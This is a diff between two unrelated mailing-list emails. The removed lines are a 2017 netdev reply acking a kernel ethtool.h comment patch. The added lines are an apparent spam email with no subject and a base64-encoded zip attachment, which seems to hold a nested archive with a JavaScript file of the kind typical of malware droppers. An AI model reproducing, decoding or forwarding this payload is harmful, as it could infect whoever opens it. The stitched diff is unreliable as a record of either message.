@@ -1,59 +1,73 @@
-From: Andy Gospodarek <andy@greyhouse.net>
-Subject: Re: [PATCH net 3/3] ethtool.h: remind to update 802.3ad when adding
- new speeds
-Date: Thu, 8 Jun 2017 08:56:35 -0400
-Message-ID: <20170608125635.GC78114@C02RW35GFVH8.dhcp.broadcom.net>
-References: <1496913493-23293-1-git-send-email-nicolas.dichtel@6wind.com>
- <1496913493-23293-3-git-send-email-nicolas.dichtel@6wind.com>
+From: <unsubscribe.me@admisi.com>
+Subject: (unknown)
+Date: Thu, 08 Jun 2017 13:07:35 -0000
+Message-ID: <149692725575.12490.8473303159263932304@zaural.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Cc: davem@davemloft.net, netdev@vger.kernel.org, j.vosburgh@gmail.com,
-        vfalico@gmail.com, thibaut.collet@6wind.com, linville@tuxdriver.com
-To: Nicolas Dichtel <nicolas.dichtel@6wind.com>
+Content-Type: application/zip; name="33904617.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail-qt0-f195.google.com ([209.85.216.195]:36186 "EHLO
-        mail-qt0-f195.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1750725AbdFHM4h (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Thu, 8 Jun 2017 08:56:37 -0400
-Received: by mail-qt0-f195.google.com with SMTP id s33so7871991qtg.3
-        for <netdev@vger.kernel.org>; Thu, 08 Jun 2017 05:56:37 -0700 (PDT)
-Content-Disposition: inline
-In-Reply-To: <1496913493-23293-3-git-send-email-nicolas.dichtel@6wind.com>
+Received: from ws142.zone31-163-128.zaural.ru ([31.163.128.142]:57649 "HELO
+        zaural.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751428AbdFHNHj (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Thu, 8 Jun 2017 09:07:39 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-On Thu, Jun 08, 2017 at 11:18:13AM +0200, Nicolas Dichtel wrote:
-> Each time a new speed is added, the bonding 802.3ad isn't updated. Add a
-> comment to remind the developer to update this driver.
-> 
-> Signed-off-by: Nicolas Dichtel <nicolas.dichtel@6wind.com>
-
-Acked-by: Andy Gospodarek <andy@greyhouse.net>
-
-> ---
->  include/uapi/linux/ethtool.h | 6 ++++--
->  1 file changed, 4 insertions(+), 2 deletions(-)
-> 
-> diff --git a/include/uapi/linux/ethtool.h b/include/uapi/linux/ethtool.h
-> index d179d7767f51..7d4a594d5d58 100644
-> --- a/include/uapi/linux/ethtool.h
-> +++ b/include/uapi/linux/ethtool.h
-> @@ -1486,8 +1486,10 @@ enum ethtool_link_mode_bit_indices {
->   * it was forced up into this mode or autonegotiated.
->   */
->  
-> -/* The forced speed, in units of 1Mb. All values 0 to INT_MAX are legal. */
-> -/* Update drivers/net/phy/phy.c:phy_speed_to_str() when adding new values */
-> +/* The forced speed, in units of 1Mb. All values 0 to INT_MAX are legal.
-> + * Update drivers/net/phy/phy.c:phy_speed_to_str() and
-> + * drivers/net/bonding/bond_3ad.c:__get_link_speed() when adding new values.
-
-A little wide, but not wider than it was before, so that's fine with me.
-
-> + */
->  #define SPEED_10		10
->  #define SPEED_100		100
->  #define SPEED_1000		1000
-> -- 
-> 2.8.1
-> 
+UEsDBAoAAgAAAESWyEpSK7PTlwsAAJcLAAAHABwANDI2LnppcFVUCQAD/0c5Wf9HOVl1eAsAAQQA
+AAAABAAAAABQSwMEFAACAAgARJbISsZZDaL1CgAA8yIAAAYAHAA0MjYuanNVVAkAA/9HOVn/RzlZ
+dXgLAAEEAAAAAAQAAAAA7VrbbhtHEn22Af+DMS/miIOk5z4DhQssAuzbgg9+FCVgrpZiWwMwdFaB
+4X/fOlWnOUPKgpWFsYtgk2QisqcvdTl1uqqb46f77nA33b+ets657bTayj/yOZI/zk0ufPXy86uX
+L/bD4dP+/jVf3vDl5auXX169HP0U8m6aZIpJ3m0nF02TkyY/xW/N/jU6TG6ScS8O+9/l/3ihb+42
+wT+bQ4A3L9hrs7of/vX6H5x9FVjzNogCWV3+m/TThH/lE9ayNi+rdb8K1nfr4PaKPa9X/M7+16vw
+gtOF15dBeC58BBn+vt83v6/iKInSKBg/TNM+CK/S68fv9s19P33Ul2EIXcQ8L7rm0N2uhn1Ifb8s
+7Hm0x9KO38EVkyonU8hEosfCBVhPXkK4cdqvLi9D9YG5w/yh/X7ZBDbHdoX/yzwwGYx2/cOvn9pf
+D/tVEiVheINXIsDVFpZz7tp8qHO83wTd7Rsx+dx02AQqhQ3a0ILsQNnOHT9BDjj5sA5g67yM8iSK
+XRzFcR0laR0VSZTFUeXkSxUVKb7HVRwVTnpkUR7JkDCiGhtOd/XmowBu/X4d/Ljbvf2cffnxXRiJ
+APLvdrMLdkFEfTfuEpYysdkSUVt5x7afOP0PH4b7d4db37xe+67rdfj5blzx2982NAH7h5/nGb9Q
+ivUG8QQ3Butf1kF4+SVYA5PStAq/8SlYcZIQoPYwCM3O7X5o3utHYPEEoETA3cYd3y/wOoPnLO5t
+1UWgY+mtOwt0tj72LybVwBbYT/rJOIHfLwkZ+bbdoEVmWd2F2vywWdAOOkScLryk0A+wQBYFH5rf
+huB5YXmU/kRNLmxRcRJTCqjtmbZs/Zq2MgEoa/KfVOJp2igSY0Gil52dr9j1esWe5lUT5IyGgo9Q
+TDgoeR4HzcKfEMgEOJ/4dIKfRZ/g4mZsL26y+OLGyd84u7ip5W9eSltxcZMOFzedPHklj7R30q+U
+z3Eqf+Xz2F3c9K31dY20y9PKk0l7lltfzJf1Mj6Rz7X0kXexjC1krTG2J8f4zNav8Le0/gnk6Wx+
+zNfJurnM5Zy8k++DPKMz+RK0p1xPZHayVtFT/pjyJ7Z+Kv0KmXOQPqOskSWcc7y4aTAf1pQ+qcxf
+yRwZbCP969L0TmKTo5e+PWxXWB8dL3OV8hSx6QR7FKOtC11cabYqKtO9lzUyZzbBO9hY5a25vjN7
+YPyIuaU9kfUSaWulX9ub/7RPazaKRedM1kylvUrMH9D/uevDXxgD/1cN55angi1z8xPs39IHkBX2
+Tkfav7G2UvrXtF8+cm70jW08bI0H8ynm5OlHWwvzJZQ5b2zOzplvYYskD9aCZiB4MCQCBRgV55S0
+N88qCgtDFJ4R7ZV5rYQWYrFuNKvDy7ACrJ47WxleaLr5ewcEO5urSG1tWBLSA0W5rN1nhiC1YmdW
+UC2A4pIWw/rSf5C1x9SsgDbIUKU2PyynXsT4zN5pxNXm5aJeoIBIccnCa4lFRp0aqr0X8BfR6r04
+VhZlOqYyeY9RiPlakwVPV862RBR5/dX+JeXvDCnwNFCkrJKesoDqL/2HytaPe7Md0FknZB2PQo8i
+IKRZrJ/YWEQybImIAwvA/5ADqPFRkNMG8I3qD4TJ94FMoPpDLnkqMh4wpKw0ziiGrxSFvUVRV5kP
+Ia8yHfBXMgrke+JszZhRplhL4SeP4KKhFXNDISSAJKqFs1k0tvz30XhHEStSFa2heOhNQ0QAEF7V
+Zg14FJyk/EdJOyIYEimXZ8YvilJwaW4oyjinorgx7gfyesYiEA/5YYGWHI73eCqi1HGNqp25BV7E
+eFgZPKFRUBHFjuvH5LJvebFfjC9p6dZQhwhQbirMixifkbvVTrUxxFidRvF/DwV/Zv97BP+Fgv9n
+FPyZ/e8R/C0U6A5OFGDX1LyEkvUF0cEdeRyZkWD8YBJCC91Bc7Oi94LmNSV39NJ2pAY7krM2zaU7
+2xGRUailW9vRkd34vExzQObVmtcOzGNzrt/MeaCiqOMO+b/MSGqbr2c0Ya2Cee5x/cTGwIsFdUh7
+iwLkwpoR1DYXMpWj/rlFT8YdXfNSZnGaV1aWbahtc0P8Mi9tmbGp/51Fakl/oS6p6DPYExFXpoa4
+ggiE/aG/Z4G2M4yo/WuT/5jRtMQW646RtRHwBcQCQ1oHLfRvWIPkmUdw72YranWQGZK0usksljpq
+kGXGRU1l1Rc8i/HgB8R2wSiAFRA3iiLmysi5UC0CKV1uKIb2mvNWzCtboqibLQv+Qexqju1YHTTm
+Ea3UYnIpuWxsLDdFTqnxPszViXJRMlcXGSNUo22gF7OZi5RjUN305iX0Tyrjopg896i6rK26VFuR
+7zQKWkMeokDlL/muYnUr/cvCbKW5KiNTq9nRxiuX1TMXgXV62gL2KRiFqn9B5EJ+8qruBU9EAdhF
+q2tnPnTjHHk1c3hFIav7jLk5fFk2tH9tYzuiF/LDz8e6plno3xmGalaGWEvz+tEiOSsWUfhVFj1y
+MLg0nbkUVoQUiuLaEBTHM2qWsZizYoMUqH31jCKlFoxTSAwraE3MHSk929G/+xlFb1EALnA9PZVw
+RxusuoQ+Bb3SV4zxjFwYmw6Q5VjdlHMUYVxF/o59vd0tzmhyiwJvEz3HoH31jCcxfYpu3ot0LrIA
+GMDX6I47KbhTub6ysxT1R2HRDxaBrEBnIXONpcmvUcLKE6gClyLqgapGxpeMzIHzqG6OGRGjwu+F
+1eKMxnH9jMjSjCDm+4b2r+aMxlfnOffjtOFeRRbpmWlBLrAYsDNkxgJa3S/8Bzyq/Y8IzrkrPqlF
+YxbXvKaYGR3xjx0yZ56jOSIzEs0LR7NkQSv6vAzWhGTg0nZgVCCv6cjF3DWxmy65XE9a/ogVeMZy
+PClLzQslczVwjnJpaag+2Qtqomica3zdC2irspmjKKdOiAIgDRGrXCSfB57kLb3oEZFki5NGskBO
+xOv42GyYk08R4R1lhZzKIsUir/0KCyGKlEspW5XOeWzpmaefT0r1pIsRCv1Hnp7pGVVL/bkfpxhT
+zP5QLnfzXoa9CHyqJ7VnZ0ywIaLwyGLwf286wp5+Lxm49yhzgSlO7OcR/J9YMXdzdVAlsxX9jo4d
+HFIcM5I/wuXkMpyn6klVaigCir+Zl7fMAX1GgNyaVVzezBkBsobzjMav75gdwYs+L8+Zh4N7Gu4b
+uiPH9OIz8lrYOOZJlbIAqrOO59Vkha6c10JdABQNrDWwtspfso7oLP+tmeNmPG/WGsbXBS33Emen
+bBrFDbOr+gkWWpx06kldOnO5Zj30leP4eliM7xfjn0ChZqQ8g0auC/1j6vRUdal7GVmwLnyN4xGs
+eUlHq9T0SGZSpNzRVAtmA9CmYU6lXqxZHTQ832xmzlIuHyweY1oXefRT2b3f0XJmDD6K2gUXQrua
+OZRjtaTnpfF866BRODIKmNVoTsUdqSNf66m535FZ3SAKY1/5IBsoyPXnGcWiOqv6hRcX9ku4myoX
+8dZHc+eCeemiujuvTsGdVt3qHfHxzkqvoh7dQ/r7atwEnv7uYIv7/PPrSGt9dEGHuzbnLyEfNrvA
+PeyCNZuv3hymt4f93f27N9er0ztGv+7zbv69RKe3bnbfa3fB08nlm15rfuWXEw+bAOLYFTq7Pf7p
+hIPwotKd/mhCJaWC/lr8bbB+WAfvrnbBuMNvJHbBbbP/eYcrZ+2Ou0ed5ag0R6rqJnAU7KePPwcn
+N5LB1A9BeBU/9zbS6/l9fhHhfwhxvM8ML/8NUEsBAh4DFAACAAgARJbISsZZDaL1CgAA8yIAAAYA
+GAAAAAAAAQAAAKSBAAAAADQyNi5qc1VUBQAD/0c5WXV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQAB
+AEwAAAA1CwAAAABQSwECHgMKAAIAAABElshKUiuz05cLAACXCwAABwAYAAAAAAAAAAAApIEAAAAA
+NDI2LnppcFVUBQAD/0c5WXV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE0AAADYCwAAAAA=
